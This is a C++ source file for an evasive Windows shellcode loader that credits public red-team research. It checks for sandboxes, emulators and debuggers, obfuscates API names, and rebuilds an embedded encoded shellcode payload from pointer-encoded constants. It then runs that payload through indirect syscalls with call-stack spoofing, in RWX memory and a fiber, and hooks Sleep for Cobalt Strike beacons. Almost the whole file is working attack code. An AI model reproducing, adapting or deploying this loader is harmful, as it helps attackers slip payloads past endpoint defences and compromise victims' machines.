/*
* Credits
* 
* MDSec - Resolving System Service Numbers using the Exception Directory
* https://www.mdsec.co.uk/2022/04/resolving-system-service-numbers-using-the-exception-directory/
* 
* cpu0x00 - Ghost: Evasive shellcode loader
* https://github.com/cpu0x00/Ghost
* 
* susMdT - LoudSunRun: Stack Spoofing with Synthetic frames based on the work of namazso, SilentMoonWalk, and VulcanRaven
* https://github.com/susMdT/LoudSunRun
*
* HulkOperator - x64 Call Stack Spoofing
* https://hulkops.gitbook.io/blog/red-team/x64-call-stack-spoofing
* https://github.com/HulkOperator/CallStackSpoofer
* 
* Jan Vojtesek - Raspberry Robin's Roshtyak: A Little Lesson in Trickery
* https://decoded.avast.io/janvojtesek/raspberry-robins-roshtyak-a-little-lesson-in-trickery/
* 
* dadevel - Detecting Sandboxes Without Syscalls
* https://pentest.party/posts/2024/detecting-sandboxes-without-syscalls/
*/

#include <includes.h>

EXTERN_C DWORD dwSSN = 0;
EXTERN_C PVOID qwJMP = 0;
EXTERN_C PVOID CallR12(PVOID Function, ULONGLONG nArgs, PVOID r12_gadget, ...);
NTAPI_FUNCTION CallMe();

PBYTE hNtdll = FindModuleBase("ntdll.dll");
PBYTE hKernel32 = FindModuleBase("KERNEL32.DLL");
BYTE callR12sig[] = { 0x41, 0xFF, 0xD4 };
std::vector<PVOID> callR12gadgets = CollectGadgets(callR12sig, sizeof(callR12sig), hNtdll);
PVOID gadget = nullptr;
NTSTATUS status = STATUS_UNSUCCESSFUL;

CHAR NtCE[] = "ZwCreateEvent";
CHAR NtWFSO[] = "ZwWaitForSingleObject";
SyscallEntry NtCreateEvent = SSNLookup(NtCE);
SyscallEntry sysNtWaitForSingleObject = SSNLookup(NtWFSO); // NtWaitForSingleObject is predefined in winternl.h

LPVOID mainFiber = nullptr;
LPVOID shellcodeFiber = nullptr;

// Function to deobfuscate ASCII-encoded strings
std::unique_ptr<char[]> unASCIIme(const int* asciiValues, size_t length) {
	auto decoded = std::make_unique<char[]>(length + 1);

	for (size_t i = 0; i < length; ++i)
		decoded[i] = static_cast<char>(asciiValues[i]);

	decoded[length] = '\0'; // Null-terminate the string
	return decoded;
}

VOID RunMe() {
	const PKUSER_SHARED_DATA ksd = (PKUSER_SHARED_DATA)KUSER_SHARED_DATA_ADDRESS;
	
	// Check if Secure Boot is enabled
	if (!ksd->DbgSecureBootEnabled) __fastfail(0xc00000022); // Exit process if Secure Boot is disabled

	// Check for number of processors
	if (ksd->ActiveProcessorCount <= 4) __fastfail(0xc00000022); // Exit process if 4 or less active processors

	constexpr uint32_t TICKS_PER_SECOND = 10'000'000;
	LARGE_INTEGER time1;
	time1.LowPart = ksd->InterruptTime.LowPart;
	time1.HighPart = ksd->InterruptTime.High2Time;
	//if ((time1.QuadPart / TICKS_PER_SECOND / 60 / 60) < 1) __fastfail(0xc00000022); // Exit process if uptime is less than 1 hour
	
	//if (ksd->BootId < 100) __fastfail(0xc00000022); // Exit process if boot count is less than 100

	// Check for KdDebuggerEnabled
	if (ksd->KdDebuggerEnabled) __fastfail(0xc00000022); // Exit process if true

	// Simple check for VDLLs / Defender emulator
	if (GetProcAddress((HMODULE)hNtdll, "MpVmp32Entry")) __fastfail(0xc00000022); // Exit process if VDLL import is successful

	// Another check for debugger
	const int aZwQIP[] = { 90, 119, 81, 117, 101, 114, 121, 73, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110, 80, 114, 111, 99, 101, 115, 115 };
	std::unique_ptr<char[]> ZwQIP = unASCIIme(aZwQIP, (sizeof(aZwQIP) / sizeof(aZwQIP[0])));
	const PCHAR NtQIP = ZwQIP.get();

	SyscallEntry NtQueryInformationProcess = SSNLookup(NtQIP);
	dwSSN = NtQueryInformationProcess.SSN;
	qwJMP = NtQueryInformationProcess.Syscall;
	gadget = GoGoGadget(callR12gadgets);

	PVOID debugFlags = nullptr;
	if (NT_SUCCESS((NTSTATUS)CallR12(
		(PVOID)CallMe,
		4,
		gadget,
		NtCurrentProcess(),
		(PROCESSINFOCLASS)31, // ProcessDebugFlags
		&debugFlags,
		sizeof(debugFlags),
		NULL
	)) && debugFlags) __fastfail(0xC0000409); // Exit process if debugger is detected
	
	// Shellcode deobfuscation and preparation
	
	PVOID cHzWuUOLpKshEZso = EncodePointer((PVOID)0x4831c94881e9d4ff);
	PVOID qzmcczftlrofpMBK = EncodePointer((PVOID)0xffff488d05efffff);
	PVOID BnFPxxUTdHzXfBou = EncodePointer((PVOID)0xff48bb44f6a40b5f);
	PVOID XXNMyWIolkZnxquw = EncodePointer((PVOID)0x895d7f4831582748);
	PVOID MaFIrEQDZFRfWRTY = EncodePointer((PVOID)0x2df8ffffffe2f4b8);
	PVOID RdUZgSEaEksHKBzw = EncodePointer((PVOID)0xbe27efaf619d7f44);
	PVOID BqaqZEeAEPNHxCHA = EncodePointer((PVOID)0xf6e55a1ed90f2e12);
	PVOID pEfFdhEqFdQpoqch = EncodePointer((PVOID)0xbe95d93ac1d62d24);
	PVOID WOLbfAoYkcEkuDYg = EncodePointer((PVOID)0xbe2f5947c1d62d64);
	PVOID uwiZKXhkheFneKTM = EncodePointer((PVOID)0xbe2f790fc152c80e);
	PVOID FMlGRbqbLHPhGOeo = EncodePointer((PVOID)0xbce93a96c16cbfe8);
	PVOID yXPdbUEcVExPHxIj = EncodePointer((PVOID)0xcac5775da57d3e85);
	PVOID MZGgjmoAILVGCTyd = EncodePointer((PVOID)0x3fa94a5e48bf9216);
	PVOID GurEATzzcVZVIzYS = EncodePointer((PVOID)0xb7f543d4db7df406);
	PVOID hNplZltYVPpESpst = EncodePointer((PVOID)0xcaec0a8f02ddf744);
	PVOID xCgWVknCyvRsVUHZ = EncodePointer((PVOID)0xf6a443da4929180c);
	PVOID umughcydaJUtAhrt = EncodePointer((PVOID)0xf7745bd4c1453bcf);
	PVOID RqCqvWaIneDObANK = EncodePointer((PVOID)0xb684425e59be290c);
	PVOID axOWFjDeHhmDuStA = EncodePointer((PVOID)0x096d4ad4bdd53745);
	PVOID PzyVUWkmkIQWwsAh = EncodePointer((PVOID)0x20e93a96c16cbfe8);
	PVOID UKaEuxbaMHcFVHRE = EncodePointer((PVOID)0xb765c252c85cbe7c);
	PVOID GPBJMzmxizdGDxbs = EncodePointer((PVOID)0x16d1fa138a115b4c);
	PVOID aEUbBqlVLqLgCpmm = EncodePointer((PVOID)0xb39dda2a51053bcf);
	PVOID HKzolWqSFHEaxocQ = EncodePointer((PVOID)0xb680425e593b3ecf);
	PVOID rGrpgUSTDCGnRSxX = EncodePointer((PVOID)0xfaec4fd4c9413645);
	PVOID UkiKuEWPihQsBZed = EncodePointer((PVOID)0x26e5805b01157e94);
	PVOID UtRdjVdGKiLgoqiz = EncodePointer((PVOID)0xb7fc4a07d7042505);
	PVOID jmRaVonpGRiCdgiL = EncodePointer((PVOID)0xaee5521ed315fca8);
	PVOID pTGvgohiOFOLvctP = EncodePointer((PVOID)0xd6e559a069053e1d);
	PVOID jjMvRmnTSOFJsHUQ = EncodePointer((PVOID)0xacec804d600a80bb);
	PVOID ecThXoPqvgeoPdTY = EncodePointer((PVOID)0x09f943e5885d7f44);
	PVOID KqVeBhXZWhqorIlQ = EncodePointer((PVOID)0xf6a40b5fc1d0f245);
	PVOID rUrHyjHgczZsKdEw = EncodePointer((PVOID)0xf7a40b1e336cf42b);
	PVOID BHscujBmZqkyPcao = EncodePointer((PVOID)0x715bdee479e8dd12);
	PVOID nbtyRzIjuCLOzHPX = EncodePointer((PVOID)0xb71eadca34c08091);
	PVOID oaAwYlpVCipgbUeo = EncodePointer((PVOID)0xbe27cf77b55b034e);
	PVOID RfLfmiVPuCbBjmaj = EncodePointer((PVOID)0x765feb2a8ce63857);
	PVOID eFSJSYqBtDEtyjXg = EncodePointer((PVOID)0x84cb615fd01cf69e);
	PVOID beyiUDTcLMuJgbDM = EncodePointer((PVOID)0x09716e27f9311036);
	PVOID yaLBwyEBzokIYAHF = EncodePointer((PVOID)0x93d6253af1385f66);
	PVOID qowPmWxYQjBdZNYP = EncodePointer((PVOID)0x9ed07f2ffa67506b);
	PVOID GNvPOEZbSgXPdGal = EncodePointer((PVOID)0x9fc5326fbd6b4f7d);
	PVOID bzxbcOVbSveYzfeO = EncodePointer((PVOID)0xd8d17871e82f1c2c);
	PVOID LcYaLRXtmsZogKlT = EncodePointer((PVOID)0x9fd26e71e62f186b);
	PVOID gIKApmGFAWwPmQgq = EncodePointer((PVOID)0xc28b622bec300c6b);
	PVOID XQGRystfEcTjlPuc = EncodePointer((PVOID)0x84cd6834a42f1028);
	PVOID mQGOcpeQBbPvvUfc = EncodePointer((PVOID)0x9a8b5936ea365a76);
	PVOID EEezIaJMrCWOAPsU = EncodePointer((PVOID)0xc6f66433e5731625);
	PVOID QRiWTvDaBIzcspUq = EncodePointer((PVOID)0xd8c97b6bab5d7f90);

	std::vector<PVOID> encodedSegments = {
		cHzWuUOLpKshEZso, qzmcczftlrofpMBK, BnFPxxUTdHzXfBou, XXNMyWIolkZnxquw, MaFIrEQDZFRfWRTY, RdUZgSEaEksHKBzw, BqaqZEeAEPNHxCHA, pEfFdhEqFdQpoqch, WOLbfAoYkcEkuDYg, uwiZKXhkheFneKTM, FMlGRbqbLHPhGOeo, yXPdbUEcVExPHxIj, MZGgjmoAILVGCTyd, GurEATzzcVZVIzYS, hNplZltYVPpESpst, xCgWVknCyvRsVUHZ, umughcydaJUtAhrt, RqCqvWaIneDObANK, axOWFjDeHhmDuStA, PzyVUWkmkIQWwsAh, UKaEuxbaMHcFVHRE, GPBJMzmxizdGDxbs, aEUbBqlVLqLgCpmm, HKzolWqSFHEaxocQ, rGrpgUSTDCGnRSxX, UkiKuEWPihQsBZed, UtRdjVdGKiLgoqiz, jmRaVonpGRiCdgiL, pTGvgohiOFOLvctP, jjMvRmnTSOFJsHUQ, ecThXoPqvgeoPdTY, KqVeBhXZWhqorIlQ, rUrHyjHgczZsKdEw, BHscujBmZqkyPcao, nbtyRzIjuCLOzHPX, oaAwYlpVCipgbUeo, RfLfmiVPuCbBjmaj, eFSJSYqBtDEtyjXg, beyiUDTcLMuJgbDM, yaLBwyEBzokIYAHF, qowPmWxYQjBdZNYP, GNvPOEZbSgXPdGal, bzxbcOVbSveYzfeO, LcYaLRXtmsZogKlT, gIKApmGFAWwPmQgq, XQGRystfEcTjlPuc, mQGOcpeQBbPvvUfc, EEezIaJMrCWOAPsU, QRiWTvDaBIzcspUq,
	};

	// Predefine expected shellcode size and pre-allocate space
	alignas(8) std::vector<UCHAR> shellcode;
	//shellcode.reserve(968);
	shellcode.reserve(392);

	// Decode and reconstruct each segment
	for (auto encodedSegment : encodedSegments) {
		UINT_PTR decodedSegment = reinterpret_cast<UINT_PTR>(DecodePointer(encodedSegment));

		// Extract each byte and place it in the shellcode buffer
		shellcode.push_back((decodedSegment >> 56) & 0xFF);
		shellcode.push_back((decodedSegment >> 48) & 0xFF);
		shellcode.push_back((decodedSegment >> 40) & 0xFF);
		shellcode.push_back((decodedSegment >> 32) & 0xFF);
		shellcode.push_back((decodedSegment >> 24) & 0xFF);
		shellcode.push_back((decodedSegment >> 16) & 0xFF);
		shellcode.push_back((decodedSegment >> 8) & 0xFF);
		shellcode.push_back(decodedSegment & 0xFF);
	}

	const int aZwAVM[] = { 90, 119, 65, 108, 108, 111, 99, 97, 116, 101, 86, 105, 114, 116, 117, 97, 108, 77, 101, 109, 111, 114, 121 }; // ZwAllocateVirtualMemory
	std::unique_ptr<char[]> ZwAVM = unASCIIme(aZwAVM, (sizeof(aZwAVM) / sizeof(aZwAVM[0])));
	const PCHAR NtAVM = ZwAVM.get();

	SyscallEntry NtAllocateVirtualMemory = SSNLookup(NtAVM);
	dwSSN = NtAllocateVirtualMemory.SSN;
	qwJMP = NtAllocateVirtualMemory.Syscall;
	gadget = GoGoGadget(callR12gadgets);

	PVOID baseAddress = nullptr;
	SIZE_T regionSize = shellcode.size();
	status = (NTSTATUS)CallR12(
		(PVOID)CallMe,
		6,
		gadget,
		NtCurrentProcess(),
		&baseAddress,
		(ULONGLONG)0,
		&regionSize,
		(ULONGLONG)(MEM_COMMIT | MEM_RESERVE),
		(ULONGLONG)(PAGE_EXECUTE_READWRITE)
	);

	const int aZwWVM[] = { 90, 119, 87, 114, 105, 116, 101, 86, 105, 114, 116, 117, 97, 108, 77, 101, 109, 111, 114, 121 }; // ZwWriteVirtualMemory
	std::unique_ptr<char[]> ZwWVM = unASCIIme(aZwWVM, (sizeof(aZwWVM) / sizeof(aZwWVM[0])));
	const PCHAR NtWVM = ZwWVM.get();

	SyscallEntry NtWriteVirtualMemory = SSNLookup(NtWVM);
	dwSSN = NtWriteVirtualMemory.SSN;
	qwJMP = NtWriteVirtualMemory.Syscall;
	gadget = GoGoGadget(callR12gadgets);

	SIZE_T bytesWritten = 0;
	status = (NTSTATUS)CallR12(
		(PVOID)CallMe,
		5,
		gadget,
		NtCurrentProcess(),
		baseAddress,
		shellcode.data(),
		(ULONGLONG)shellcode.size(),
		&bytesWritten
	);

	// Create a callable "function" from the allocated space
	void (*shellcodeFunc)() = (void(*)())baseAddress;
	
	// Hook Sleep and SleepEx for CS beacons
	ReSleep();

	gadget = GoGoGadget(callR12gadgets);
	mainFiber = (LPVOID)CallR12((PVOID)ConvertThreadToFiber, 1, gadget, nullptr);

	gadget = GoGoGadget(callR12gadgets);
	shellcodeFiber = (LPVOID)CallR12((PVOID)CreateFiber, 3, gadget, NULL, (LPFIBER_START_ROUTINE)shellcodeFunc, NULL);

	while (true) {
		gadget = GoGoGadget(callR12gadgets);
		CallR12((PVOID)SwitchToFiber, 1, gadget, shellcodeFiber);
	}
}

INT WINAPI CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) {
	if (FiveHourEnergy()) __fastfail(0x31337);
	RunMe();
	return 0;
}

/*
int main() {
	BYTE sig[] = { 0xff, 0x27 };
	std::vector<PVOID> gadgets = CollectGadgets(sig, 2, hNtdll);
	CheckGadgetPreBytes(gadgets, 2, 8);
}
*/
